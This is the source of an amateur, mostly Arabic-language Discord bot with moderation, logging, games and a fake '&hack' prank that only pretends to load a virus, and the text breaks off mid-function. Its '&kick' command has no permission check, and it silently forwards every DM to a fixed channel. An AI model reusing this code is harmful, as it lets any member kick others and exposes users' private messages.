// Code Of L-Ro3b App
const Discord = require('discord.js');
const client = new Discord.Client();
var prefix = '&';
const ms = require("ms");
const fs = require("fs");
var Canvas = require('canvas');
var jimp = require('jimp');
const bot = new Discord.Client({disableEveryone: true});
bot.commands = new Discord.Collection();
client.on('ready', () => {
  console.log(`---------------------------------------`);
  console.log(`Logged in as ${client.user.tag}!`);
  console.log(`---------------------------------------`);
});

client.on('message', msg => {
  if (msg.content === 'ping') {
    msg.reply('Pong!');
  }
});

client.on('message', message => {
var prefix = "&";

if (!message.content.startsWith(prefix)) return;
var args = message.content.split(' ').slice(1);
var argresult = args.join(' ');
if (message.author.id == 410835593451405312) return;
if (message.content.startsWith(prefix + 'playing')) {
if (message.author.id !== '299899582211555329') return message.reply('** هذا الأمر فقط لصاحب البوت و شكراًً **')
client.user.setGame(argresult);
 message.channel.sendMessage(`**${argresult}** : تم تغيير الحالة`)
} else


if (message.content.startsWith(prefix + 'streem')) {
if (message.author.id !== '299899582211555329') return message.reply('** هذا الأمر فقط لصاحب البوت و شكراًً **')
client.user.setGame(argresult, "http://twitch.tv/y04zgamer");
 message.channel.sendMessage(`**${argresult}** :تم تغيير الحالة الى ستريمنج`)
} else

if (message.content.startsWith(prefix + 'setname')) {
if (message.author.id !== '299899582211555329') return message.reply('** هذا الأمر فقط لصاحب البوت و شكراًً **')
client.user.setUsername(argresult).the
message.channel.sendMessage(`**${argresult}** : تم تغير الأسم`)
return message.reply("**لا تستطيع تغيير الأسم الا بعد ساعتين**");
} else
 
if (message.content.startsWith(prefix + 'setavatar')) {
if (message.author.id !== '299899582211555329') return message.reply('** هذا الأمر فقط لصاحب البوت و شكراًً **')
client.user.setAvatar(argresult);
 message.channel.sendMessage(`**${argresult}** : تم تغيير صورة البوت`);
} else


if (message.content.startsWith(prefix + 'watching')) {
if (message.author.id !== '299899582211555329') return message.reply('** هذا الأمر فقط لصاحب البوت و شكراًً **')
 client.user.setActivity(argresult, {type : 'watching'});
message.channel.sendMessage(`**${argresult}** : تم تغيير الووتشينق الى`)
}
if (message.content.startsWith(prefix + 'setl')) {
if (message.author.id !== '299899582211555329') return message.reply('** هذا الأمر فقط لصاحب البوت و شكراًً **')
client.user.setActivity(argresult, {type : 'listening'});
message.channel.sendMessage(`**${argresult}**: تم تغيير الاستماع الي`)
}

});

client.on('roleCreate', role => {
  client.setTimeout(() => {
    role.guild.fetchAuditLogs({
        limit: 1,
        type: 30
      })
      .then(audit => {
        let exec = audit.entries.map(a => a.executor.username)
        try {

          let log = role.guild.channels.find('name', 'log');
          if (!log) return;
          let embed = new Discord.RichEmbed()
            .setTitle('➕ RoleCreated')
            .addField('Role Name', role.name, true)
            .addField('Role ID', role.id, true)
            .addField('By', exec, true)
            .setTimestamp()
          log.send(embed).catch(e => {
            console.log(e);
          });
        } catch (e) {
          console.log(e);
        }
      })
  }, 1000)
})

client.on('voiceStateUpdate', (oldM, newM) => {
  let m1 = oldM.serverMute;
  let m2 = newM.serverMute;

  let d1 = oldM.serverDeaf;
  let d2 = newM.serverDeaf;

  let ch = oldM.guild.channels.find('name', 'log')
  if(!ch) return;

    oldM.guild.fetchAuditLogs()
    .then(logs => {

      let user = logs.entries.first().executor

    if(m1 === false && m2 === true) {
       let embed = new Discord.RichEmbed()
       .setAuthor(`${newM.user.tag}`, newM.user.avatarURL)
       .setDescription(`${newM} اتعملو ميون`)
       .addField('بواسطة',`${user}`)

       ch.send(embed)
    }
    if(m1 === true && m2 === false) {
       let embed = new Discord.RichEmbed()
       .setAuthor(`${newM.user.tag}`, newM.user.avatarURL)
       .setDescription(`${newM} اتشال الميون بتاعه`)
       .addField('بواسطة',`${user}`)
       .setTimestamp()

       ch.send(embed)
    }
    if(d1 === false && d2 === true) {
       let embed = new Discord.RichEmbed()
       .setAuthor(`${newM.user.tag}`, newM.user.avatarURL)
       .setDescription(`${newM} اتعمله سيرفر دفنوني`)
       .addField('بواسطة',`${user}`)
       .setTimestamp()

       ch.send(embed)
    }
    if(d1 === true && d2 === false) {
       let embed = new Discord.RichEmbed()
       .setAuthor(`${newM.user.tag}`, newM.user.avatarURL)
       .setDescription(`${newM} اتشال السيرفر دفنوني بتاع`)
       .addField('بواسطة',`${user}`)
       .setTimestamp()

       ch.send(embed)
    }
  })
})
client.on('guildMemberAdd', member => {
    if (!member || !member.id || !member.guild) return;
    const guild = member.guild;
	
    const channel = member.guild.channels.find('name', 'log');
    if (!channel) return;
    let memberavatar = member.user.avatarURL
    const isNew = (new Date() - member.user.createdTimestamp) < 900000 ? '🆕' : '';
    
    let embed = new Discord.RichEmbed()
       .setAuthor(`${member.user.tag}`, member.user.avatarURL)
	   .setThumbnail(memberavatar)
       .setColor('GREEN')
       .setDescription(`📥 <@${member.user.id}> **دخل السيرفر**\n\n`)
       .setTimestamp();
     channel.send({embed:embed});
});
//

//
client.on('guildMemberRemove', member => {
    if (!member || !member.id || !member.guild) return;
    const guild = member.guild;
	
    const channel = member.guild.channels.find('name', 'log');
    if (!channel) return;
    let memberavatar = member.user.avatarURL
    
    let embed = new Discord.RichEmbed()
       .setAuthor(`${member.user.tag}`, member.user.avatarURL)
	   .setThumbnail(memberavatar)
       .setColor('RED')
       .setDescription(`📤 <@${member.user.id}> **خرج من السيرفر**\n\n`)
       .setTimestamp();
     channel.send({embed:embed});
});


client.on('messageDelete', message => {
    if (!message || !message.id || !message.content || !message.guild || message.author.bot) return;
    const channel = message.guild.channels.find('name', 'log');
    if (!channel) return;
    
    let embed = new Discord.RichEmbed()
       .setAuthor(`${message.author.tag}`, message.author.avatarURL)
       .setColor('BLACK')
       .setDescription(`🗑️ **حذف رساله**
**ارسلها <@${message.author.id}>                                                                                                                        تم حذفها في شات** <#${message.channel.id}>\n\n \`${message.cleanContent}\``)
       .setTimestamp();
     channel.send({embed:embed});

});


client.on('messageUpdate', (message, newMessage) => {
    if (message.content === newMessage.content) return;
    if (!message || !message.id || !message.content || !message.guild || message.author.bot) return;
    const channel = message.guild.channels.find('name', 'log');
    if (!channel) return;
    
    let embed = new Discord.RichEmbed()
       .setAuthor(`${message.author.tag}`, message.author.avatarURL)
       .setColor('SILVER')
       .setDescription(`✏ **تعديل رساله
ارسلها <@${message.author.id}>                                                                                                                         تم تعديلها في شات** <#${message.channel.id}>\n\nقبل التعديل:\n \`${message.cleanContent}\`\n\nبعد التعديل:\n \`${newMessage.cleanContent}\``)
       .setTimestamp();
     channel.send({embed:embed});

});
client.on("roleCreate", rc => {
  const channel = rc.guild.channels.find("name", "log") 
  if(channel) {
  var embed = new Discord.RichEmbed()
  .setTitle(rc.guild.name)
  .setDescription(`***Created Role Name : *** **${rc.name}** `)
  .setColor(`RANDOM`)
  .setTimestamp(); 
  channel.sendEmbed(embed)
  }
  });
  
  client.on("roleDelete",  rd => {
  const channel = rd.guild.channels.find("name", "log")
  if(channel) {
  var embed = new Discord.RichEmbed()
  .setTitle(rd.guild.name)
  .setDescription(`***Deleted Role Name : *** **${rd.name}** `)
  .setColor(`RANDOM`)
  .setTimestamp(); 
  channel.sendEmbed(embed)
  }
  });
  client.on("message", message => {
    var prefix = ".";
    if (message.author.id === client.user.id) return;
    const command = message.content.split(" ")[0];

    if(command == prefix+"vc"){

        if (!message.guild.member(message.author).hasPermission('MOVE_MEMBERS') || !message.guild.member(message.author).hasPermission('ADMINISTRATOR')) {
            return message.reply('you do not have permission to perform this action!');
        }

        var member = message.guild.members.get(message.mentions.users.array()[0].id);
        if(!message.mentions.users){
            message.reply("please mention the member")
            return;
        }

    if(!member.voiceChannel){
    message.reply("i can't include voice channel for member!")
    return;
    }
       if (message.author.id !== '239614214816137216') return message.reply('** يخوي اي حد عاوز اي حج خش كلمون + هذا الامر للاداره فقط يالخوي **')
              message.guild.createChannel('voicekick', 'voice').then(c => {
                member.setVoiceChannel(c).then(() => {
                    c.delete(305).catch(console.log)
        


      });
     });
    }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === '&help') {
    msg.reply('Check Your DM :envelope_with_arrow:');
  }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === 'رابط') {
    msg.reply('Check Your DM :envelope_with_arrow:');
  }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === 'رابط') {
  msg.author.send('https://discord.gg/ad8e9Zy')
  }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === 'مازن') {
    msg.reply('ول ول ول ول ول ول ول ول ول ول ول ول ول');
  }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === 'عبقر') {
    msg.reply('انا جالي كود');
  }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === '&help') {
    msg.reply('لقد تم إرسال الأوامر في الخاص :envelope_with_arrow: اذا لم تصلك رساله قم بإلغاء خظر الرسائل وجرب مره اخري');
  }
});
// -------------------------------------------
client.on('message', msg => {
  if (msg.content === '&adminhelp') {
    msg.author.send(`
● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ● 
👑『اوامر ادارية』👑

👑&ban 『لتعطي شخص باند』

👑&kick 『لتعطي شخص كيك』

👑&clear 『لمسح الشات برقم』

👑&edit  『لتعديل رساله 』

👑&ct  مـلاحظه: الاسم انت تختاره『لي انشاء روم كتابي』

👑&cv  مـلاحظه: الاسم انت تختاره『لي انشاء روم صوتي』

👑&delete  『كـود يحذف الـروم سواء صوتي او كتابي』

👑&bc  『خيارات البرودكاست』 
● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ● 
    
    `);
  }
});
client.on('message', msg => {
  if (msg.content === '&help') {
    msg.author.send(`
● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ● 
                        
&server 『معلومات عن السيرفر』                      

&date 『لمعرفه التاريخ』

&ping 『لمعرفه سرعه البوت』

&members 『معلومات عن الاعضاء』

&rooms 『 لاظهار الرومات 』

&top 『 توب انفايت 』

&credit 『 يتم تطويرها 』

&roles『 لأاظهار الرولات 』

&رابط     『يرسل لك انفايت في الخاص 』

&embed 『خاصيه غرد لكن بغير طريقه』 تم ايقافها حتي اشعار اخر

&say 『لي يكرر الكلام الذي تقوله』  تم ايقافها

● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●  
    
    `);
  }
});
client.on('message', (message) => {
    if (message.content.startsWith('&ban ')) {
      if(!message.member.hasPermission('BAN_MEMBERS')) return message.reply('هذا الخاصية للدارة فقط');
        var member= message.mentions.members.first();
        member.ban().then((member) => {
         message.channel.send(member.displayName + 'تم طرد هذا الشخص من السيرفر');
        }).catch(() => {
            message.channel.send('Error :_:');
        });
    }
});
  client.on('message', (message) => {
    if (message.content.startsWith('&kick')) {
        var member= message.mentions.members.first();
        member.kick().then((member) => {
            message.channel.send(member.displayName + ' تم طرد هذا الشخص من السيرفر');
        }).catch(() => {
            message.channel.send(":x:");
        });
    }
}); 
var prefix = "&"

client.on('message', message => {
    if (message.author.bot) return;
    if (!message.content.startsWith(prefix)) return;

    if (message.content.startsWith(prefix + 'edit')) {
        message.channel.sendMessage('Edit me').then(msg=>{msg.edit('Done edit')});
    }
});
client.on('message', message => {
    if (message.content === "&server") {
        if (!message.channel.guild) return
        var verificationLevel = message.guild.verificationLevel;
        const verificationLevels = ['None','Low','Meduim','High','Extreme'];
        var Y1 = message.guild.createdAt.getFullYear() - 2000
        var M2 = message.guild.createdAt.getMonth()
        var D3 = message.guild.createdAt.getDate()
        const xNiTRoZ = new Discord.RichEmbed()
         .setAuthor(message.author.username , message.author.avatarURL)
         .setColor('RANDOM')
         .setTimestamp()
         .setTitle(message.guild.name,message.guild.iconURL)
         .addField(':id: اي دي السيرفر',`${message.guild.id}`,true)
         .addField(':date: أنشئت في',D3 + '.' + M2 + '.' + Y1,true)             
.addField(':crown: اونر السيرفر',`<@!239614214816137216>`)
         .addField(':busts_in_silhouette: الاعضاء ' + ` ${message.guild.memberCount} `,'Online '+`[ ${message.guild.members.filter(m=>m.presence.status == 'online','idle','dnd').size} ]`+ ','+'Offline '+`[ ${message.guild.members.filter(m=>m.presence.status == 'offline').size} ]`,true)
         .addField(':speech_balloon: قنوات' +' '+message.guild.channels.size+' ',`Text [ ${message.guild.channels.filter(m => m.type === 'text').size} ]`+', '+`Voice [ ${message.guild.channels.filter(m => m.type === 'voice').size} ]`,true)
         .addField(':earth_asia: الدوله',message.guild.region)
         .addField(':ribbon: ايموجي السيرفر',`${message.guild.emojis.size}`,true)
         .addField(':construction: مستوى التحقق',`${verificationLevels[message.guild.verificationLevel]}`,true)
         .addField('&staffs'+message.guild.roles.size+' ','To See Server Original Staff')
         .addField(':closed_lock_with_key: الرتب  '+message.guild.roles.size+' ','Type `.roles` To See The Server Roles!')
         message.channel.send({embed:xNiTRoZ});
     }
    });
    client.on('message', message => {
    if (message.content === "&staffs") {
        if (!message.channel.guild) return
        const xNiTRoZ = new Discord.RichEmbed()
         .setAuthor(message.author.username , message.author.avatarURL)
         .setColor('RANDOM')
         .setTimestamp()
         .setTitle(message.guild.name,message.guild.iconURL)
         .addField('Mester','<@!239614214816137216>')
         .addField('Master','<@!267420717430079488>')
         .addField('TeamWork','<@!299899582211555329>')
         .addField('TeamWork','<@!439393453332234243>')
         .addField('TeamWork','<@!287312043734728704>')
         message.channel.send({embed:xNiTRoZ});
     }
    });
    var prefix = "&";
client.on('message', message => {
if (message.content.startsWith(prefix + 'يست')) {
    let pages = ['الصفحه الاولي','الصفحه الثانيه','الصفحه الثالثه']
    let page = 1;

    let embed = new Discord.RichEmbed()
    .setColor('RANDOM')
    .setFooter(`Page ${page} of ${pages.length}`)
    .setDescription(pages[page-1])

    message.channel.sendEmbed(embed).then(msg => {

        msg.react('◀').then( r => {
            msg.react('▶')


        const backwardsFilter = (reaction, user) => reaction.emoji.name === '◀' && user.id === message.author.id;
        const forwardsFilter = (reaction, user) => reaction.emoji.name === '▶' && user.id === message.author.id;


        const backwards = msg.createReactionCollector(backwardsFilter, { time: 20000});
        const forwards = msg.createReactionCollector(forwardsFilter, { time: 20000});



        backwards.on('collect', r => {
            if (page === 1) return;
            page--;
            embed.setDescription(pages[page-1]);
            embed.setFooter(`Page ${page} of ${pages.length}`);
            msg.edit(embed)
        })
        forwards.on('collect', r => {
            if (page === pages.length) return;
            page++;
            embed.setDescription(pages[page-1]);
            embed.setFooter(`Page ${page} of ${pages.length}`);
            msg.edit(embed)
        })
        })
    })
    }
});
    client.on('message', message => {
var prefix = "&";

    if (message.author.id === client.user.id) return;
    if (message.guild) {
   let embed = new Discord.RichEmbed()
    let args = message.content.split(' ').slice(1).join(' ');
if(message.content.split(' ')[0] == prefix + 'bc') {
    if (!args[1]) {
message.channel.send("**bc <message>**");
return;
}
        message.guild.members.forEach(m => {
   if (message.author.id !== '239614214816137216') return;
            var bc = new Discord.RichEmbed()
            .addField('» السيرفر :', `${message.guild.name}`)
            .addField('» المرسل : ', `${message.author.username}#${message.author.discriminator}`)
            .addField(' » الرسالة : ', args)
            .setColor('#ff0000')
            // m.send(`[${m}]`);
            m.send(`${m}`,{embed: bc});
        });
    }
    } else {
        return;
    }
});
      var prefix = "&";
  const HeRo = new Discord.Client();
  client.on('message', message => {
      if (message.content === prefix + "date") {
          if (!message.channel.guild) return message.reply('** This command only for servers **');  
          var currentTime = new Date(),
              Year = currentTime.getFullYear(),
              Month = currentTime.getMonth() + 1,
              Day = currentTime.getDate();

              var Date15= new Discord.RichEmbed()
              .setTitle("**『  Date - التاريخ 』 **")
              .setColor('RANDOM')
              .setTimestamp()
              .setDescription( "『"+ Day + "-" + Month + "-" + Year + "』")
              .setFooter(`*help to see all bot commands `, 'https://images-ext-1.discordapp.net/external/x-p4BwGofa_z_p9hpV-4hJPcqWh-aWGQzsmI189cDiY/%3Fwidth%3D344%26height%3D344/https/media.discordapp.net/attachments/372444859329544203/372701184055836682/ass.jpg?width=231&height=231')
               message.channel.sendEmbed(Date15);
      }
  });
    client.on('message', message => {
              if (!message.channel.guild) return;
      if(message.content =='&members')
      var IzRo = new Discord.RichEmbed()
      .setThumbnail(message.author.avatarURL)
      .setFooter(message.author.username, message.author.avatarURL) 
      .setTitle(':tulip:| Members info')
      .addBlankField(true)
      .addField(':green_book:| الاونلاين ',
      `${message.guild.members.filter(m=>m.presence.status == 'online').size}`)
      .addField(':closed_book:| دي ان دي',`${message.guild.members.filter(m=>m.presence.status == 'dnd').size}`)
      .addField(':orange_book:| خامل',`${message.guild.members.filter(m=>m.presence.status == 'idle').size}`)
      .addField(':notebook:| الاوف لاين ',`${message.guild.members.filter(m=>m.presence.status == 'offline').size}`)
      .addField('عدد اعضاء السيرفر',`${message.guild.memberCount}`)
      message.channel.send(IzRo);
    });
    client.on('message', message => {
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;

  let command = message.content.split(" ")[0];
  command = command.slice(prefix.length);

  let args = message.content.split(" ").slice(1);

// ^^say
  if (command === "---------say") {
          message.delete()
    message.channel.sendMessage(args.join(" ")).catch(console.error);
  }
  
 

if (command == "&embed") {
    let say = new Discord.RichEmbed()
    .setDescription(args.join("  "))
    .setColor(0x23b2d6)
    message.channel.sendEmbed(say);
    message.delete();
  }


});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === 'سلام عليكم') {
    msg.reply('وعليكم السلام ورحمة الله وبركاته ');
  }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === 'السلام عليكم') {
    msg.reply('وعليكم السلام ورحمة الله وبركاته ');
  }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === 'باك') {
    msg.reply('ولكم ❤');
  }
});
//--------------------------------------------
client.on('message', msg => {
  if (msg.content === 'Back') {
    msg.reply('Welcome ❤');
  }
});
//--------------------------------------------

client.on('message', message => {
    if (message.content === "&roles") {
        var roles = message.guild.roles.map(roles => `${roles.name}, `).join(' ')
        const embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .addField('الرتب:',`**[${roles}]**`)
        message.channel.sendEmbed(embed);
    }
});
  client.on('message', message => {
    if (message.content === "&rooms") {
                      if (!message.guild) return;

        var channels = message.guild.channels.map(channels => `${channels.name}, `).join(' ')
        const embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .addField(`${message.guild.name}`,`**Rooms:white_check_mark:**`)
        .addField(':arrow_down: Rooms Number. :heavy_check_mark:',`** ${message.guild.channels.size}**`)
        
.addField(':arrow_down:Rooms  Name. :heavy_check_mark::',`**[${channels}]**`)
        message.channel.sendEmbed(embed);
    }
});





    client.on('message', message => {
                                if(!message.channel.guild) return;
                        if (message.content.startsWith('&ping')) {
                            if(!message.channel.guild) return;
                            var msg = `${Date.now() - message.createdTimestamp}`
                            var api = `${Math.round(client.ping)}`
                            if (message.author.bot) return;
                        let embed = new Discord.RichEmbed()
                        .setAuthor(message.author.username,message.author.avatarURL)
                        .setColor('RANDOM')
                        .addField('Time Taken:',msg + " ms :signal_strength: ")
                        .addField('WebSocket:',api + " ms :signal_strength: ")
         message.channel.send({embed:embed});
                        }
                    });
const Sra7a = [
     'صراحه  |  صوتك حلوة؟',
     'صراحه  |  التقيت الناس مع وجوهين؟',
     'صراحه  |  شيء وكنت تحقق اللسان؟',
     'صراحه  |  أنا شخص ضعيف عندما؟',
     'صراحه  |  هل ترغب في إظهار حبك ومرفق لشخص أو رؤية هذا الضعف؟',
     'صراحه  |  يدل على أن الكذب مرات تكون ضرورية شي؟',
     'صراحه  |  أشعر بالوحدة على الرغم من أنني تحيط بك كثيرا؟',
     'صراحه  |  كيفية الكشف عن من يكمن عليك؟',
     'صراحه  |  إذا حا����ل شخص ما أن يكرهه أن يقترب منك ويهتم بك تعطيه فرصة؟',
     'صراحه  |  أشجع شيء حلو في حياتك؟',
     'صراحه  |  طريقة جيدة يقنع حتى لو كانت الفكرة خاطئة" توافق؟',
     'صراحه  |  كيف تتصرف مع من يسيئون فهمك ويأخذ على ذهنه ثم ينتظر أن يرفض؟',
     'صراحه  |  التغيير العادي عندما يكون الشخص الذي يحبه؟',
     'صراحه  |  المواقف الصعبة تضعف لك ولا ترفع؟',
     'صراحه  |  نظرة و يفسد الصداقة؟',
     'صراحه  |  ‏‏إذا أحد قالك كلام سيء بالغالب وش تكون ردة فعلك؟',
     'صراحه  |  شخص معك بالحلوه والمُره؟',
     'صراحه  |  ‏هل تحب إظهار حبك وتعلقك بالشخص أم ترى ذلك ضعف؟',
     'صراحه  |  تأخذ بكلام اللي ينصحك ولا تسوي اللي تبي؟',
     'صراحه  |  وش تتمنى الناس تعرف عليك؟',
     'صراحه  |  ابيع المجرة عشان؟',
     'صراحه  |  أحيانا احس ان الناس ، كمل؟',
     'صراحه  |  مع مين ودك تنام اليوم؟',
     'صراحه  |  صدفة العمر الحلوة هي اني؟',
     'صراحه  |  الكُره العظيم دايم يجي بعد حُب قوي " تتفق؟',
     'صراحه  |  صفة تحبها في نفسك؟',
     'صراحه  |  ‏الفقر فقر العقول ليس الجيوب " ، تتفق؟',
     'صراحه  |  تصلي صلواتك الخمس كلها؟',
     'صراحه  |  ‏تجامل أحد على راحتك؟',
     'صراحه  |  اشجع شيء سويتة بحياتك؟',
     'صراحه  |  وش ناوي تسوي اليوم؟',
     'صراحه  |  وش شعورك لما تشوف المطر؟',
     'صراحه  |  غيرتك هاديه ولا تسوي مشاكل؟',
     'صراحه  |  ما اكثر شي ندمن عليه؟',
     'صراحه  |  اي الدول تتمنى ان تزورها؟',
     'صراحه  |  متى اخر مره بكيت؟',
     'صراحه  |  تقيم حظك ؟ من عشره؟',
     'صر��حه  |  هل تعتقد ان حظك سيئ؟',
     'صراحه  |  شـخــص تتمنــي الإنتقــام منـــه؟',
     'صراحه  |  كلمة تود سماعها كل يوم؟',
     'صراحه  |  هل تُتقن عملك أم تشعر بالممل؟',
     'صراحه  |  هل قمت بانتحال أحد الشخصيات لتكذب على من حولك؟',
     'صراحه  |  متى آخر مرة قمت بعمل مُشكلة كبيرة وتسببت في خسائر؟',
     'صراحه  |  ما هو اسوأ خبر سمعته بحياتك؟',
     '‏صراحه | هل جرحت شخص تحبه من قبل ؟',
     'صراحه  |  ما هي العادة التي تُحب أن تبتعد عنها؟',
     '‏صراحه | هل تحب عائلتك ام تكرههم؟',
     '‏صراحه  |  من هو الشخص الذي يأتي في قلبك بعد الله – سبحانه وتعالى- ورسوله الكريم – صلى الله عليه وسلم؟',
     '‏صراحه  |  هل خجلت من نفسك من قبل؟',
     '‏صراحه  |  ما هو ا الحلم  الذي لم تستطيع ان تحققه؟',
     '‏صراحه  |  ما هو الشخص الذي تحلم به كل ليلة؟',
     '‏صراحه  |  هل تعرضت إلى موقف مُحرج جعلك تكره صاحبهُ؟',
	  '‏صراحه  |  هل قمت بالبكاء أمام من تُحب؟',
     '‏صراحه  |  ماذا تختار حبيبك أم صديقك؟',
     '‏صراحه  | هل حياتك سعيدة أم حزينة؟',
     'صراحه  |  ما هي أجمل سنة عشتها بحياتك؟',
     '‏صراحه  |  ما هو عمرك الحقيقي؟',
     '‏صراحه  |  ما اكثر شي ندمن عليه؟',
	 'صراحه  |  ما هي أمنياتك المُستقبلية؟‏',
]
   client.on('message', message => {
 if (message.content.startsWith('&sara7a')) {
     if(!message.channel.guild) return message.reply(' This command only for servers ');
  var client= new Discord.RichEmbed()
  .setTitle("لعبة صراحة ..")
  .setColor('RANDOM')
  .setDescription(`${Sra7a[Math.floor(Math.random() * Sra7a.length)]}`)
  .setImage("https://cdn.discordapp.com/attachments/371269161470525444/384103927060234242/125.png")
                  .setTimestamp()

   message.channel.sendEmbed(client);
   message.react("??")
 }
});

// Global Settings
var prefix = '&'; // This is the prefix, you can change it to whatever you want.

// Listener Event: Runs whenever a message is received.
client.on('message', message => {

    // Variables - Variables make it easy to call things, since it requires less typing.
    let msg = message.content.toUpperCase(); // This variable takes the message, and turns it all into uppercase so it isn't case sensitive.
    let sender = message.author; // This variable takes the message, and finds who the author is.
    let cont = message.content.slice(prefix.length).split(" "); // This variable slices off the prefix, then puts the rest in an array based off the spaces
    let args = cont.slice(1); // This slices off the command in cont, only leaving the arguments.

    // Commands


    // Purge
    if (msg.startsWith(prefix + 'CLEAR')) { // This time we have to use startsWith, since we will be adding a number to the end of the command.
        // We have to wrap this in an async since awaits only work in them.
        async function clear() {
            message.delete(); // Let's delete the command message, so it doesn't interfere with the messages we are going to delete.

            // Now, we want to check if the user has the `bot-commander` role, you can change this to whatever you want.
            if (!message.member.hasPermission('ADMINISTRATOR')) return message.reply(`انت لست ادمن`).catch(console.error);

            // We want to check if the argument is a number
            if (isNaN(args[0])) {
                // Sends a message to the channel.
                message.channel.send('يجب اختيار الرقم. \n Usage: ' + prefix + 'clear <الرقم>'); //\n means new line.
                // Cancels out of the script, so the rest doesn't run.
                return;
            }

            const fetched = await message.channel.fetchMessages({limit: args[0]}); // This grabs the last number(args) of messages in the channel.
            console.log(fetched.size + ' messages found, deleting...'); // Lets post into console how many messages we are deleting

            // Deleting the messages
            message.channel.bulkDelete(fetched)
                .catch(error => message.channel.send(`Error: ${error}`)); // If it finds an error, it posts it into the channel.

        }
        // We want to make sure we call the function whenever the purge command is run.
        clear(); // Make sure this is inside the if(msg.startsWith)
        
    }
});

client.on('message', function(message) {
    if (message.channel.type === "dm") {
        if (message.author.id === client.user.id) return;
        var embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setTimestamp()
        .setTitle('``رسالة جديدة فى الخاص``')
        .setThumbnail(`${message.author.avatarURL}`)
        .setDescription(`\n\n\`\`\`${message.content}\`\`\``)
        .setFooter(`From **${message.author.tag} (${message.author.id})**`)
    client.channels.get("451839271268122625").send({embed:embed});
    }
});

client.on('message', message => {
  if (message.content.startsWith(prefix+"avatar")) {

      var mentionned = message.mentions.users.first();
  var avatar;
    if(mentionned){
        var avatar = mentionned;
    } else {
        var avatar = message.author;
        
    }
      const embed = new Discord.RichEmbed()
      .setColor("RANDOM")
        .setAuthor(message.author.username, message.author.avatarURL)
      .setImage(`${avatar.avatarURL}`)
    message.channel.sendEmbed(embed);

  }
});

var prefix = '&';
client.on('message', msg => {
 if (msg.content.startsWith(prefix + 'send')) {
      let args = msg.content.split(' ').slice(1)
      let mentionned = msg.mentions.members.first()
      let mentionnedEmbed = new Discord.RichEmbed()
      .setTitle(`رسالة من شخص مجهول :3`)
      .setDescription(args.join(" "))
      client.users.get(`${mentionned.id}`).send(mentionnedEmbed).catch(console.error);
      msg.delete();
    }
});

client.on('message', message => {
    if (message.content.startsWith("&hack")) {
      if (message.author.bot) return
           message.delete();
             let args = message.content.split(' ').slice(1);
                   let virusname = args.join(' ');
                 if (virusname < 1) {
                     return message.channel.send("``اكتب اسم الشخص الي تبي يتهكر``");
                                     }
                 message.channel.send({embed: new Discord.RichEmbed().setTitle('Loading ' + virusname + "...").setColor(0xFF0000)}).then(function(m) {
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓ ] 1%').setColor(0xFF0000)})
             }, 1000)
            setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓] 25%').setColor(0xFF0000)})
             }, 2000)
           setTimeout(function() {     
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 100%').setColor(0xFF0000)})
             }, 3000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 1...').setColor(0xFF0000)})
             }, 4000)
              setTimeout(function() {
               m.delete()
           }, 5000)
             setTimeout(function() {
               message.channel.send('تم تهكيرك')
           }, 6000)
             setTimeout(function() {
               message.channel.send('كان مقلب يا فااااااااااااااااااطر')
           }, 7000)
           });
         }
 });
client.on('message', msg => {
  if (msg.content === 'عاوز قنية و ربع') {
  msg.react("🖕")
  }
});

client.on('guildMemberAdd', member => {
const welcomer =  member.guild.channels.find('name', 'welcome');

var Canvas = require('canvas')
var jimp = require('jimp')

const w = [`./welcome.png`];

let Image = Canvas.Image,
canvas = new Canvas(401, 202),
ctx = canvas.getContext('2d');
ctx.patternQuality = 'bilinear';
ctx.filter = 'bilinear';
ctx.antialias = 'subpixel';
ctx.shadowColor = 'rgba(0, 0, 0, 0.4)';
ctx.shadowOffsetY = 2;
ctx.shadowBlur = 2;
fs.readFile(`${w[Math.floor(Math.random() * w.length)]}`, function (err, Background) {
if (err) return console.log(err)
let BG = Canvas.Image;
let ground = new Image;
ground.src = Background;
ctx.drawImage(ground, 0, 0, 401, 202);

})

let url = member.user.displayAvatarURL.endsWith(".webp") ? member.user.displayAvatarURL.slice(5, -20) + ".gif" : member.user.displayAvatarURL;
jimp.read(url, (err, ava) => {
if (err) return console.log(err);
ava.getBuffer(jimp.MIME_PNG, (err, buf) => {
if (err) return console.log(err);

//AVATAR�
let Avatar = Canvas.Image;
let ava = new Avatar;
ava.src = buf;
ctx.drawImage(ava, 152, 27, 95, 95);

//wl
ctx.font = '12px Arial Bold';
ctx.fontSize = '10px';
ctx.fillStyle = "#000000";
ctx.textAlign = "center";
ctx.fillText(member.user.username, 200, 154);
welcomer.sendFile(canvas.toBuffer())



})
})
});

client.on("ready", () => {
    var guild;
    while (!guild)
        guild = client.guilds.get("355340943982985226");
    guild.fetchInvites().then((data) => {
        data.forEach((Invite, key, map) => {
            var Inv = Invite.code;
            data[Inv] = Invite.uses;
        });
    });
});



client.on("guildMemberAdd", (member) => {
    let channel = member.guild.channels.get("408333789878812692");
    if (!channel) {
        console.log("!the channel id it's not correct");
        return;
    }
    if (member.id == client.user.id) {
        return;
    }
    console.log('-');
    var guild;
    while (!guild)
        guild = client.guilds.get("355340943982985226");
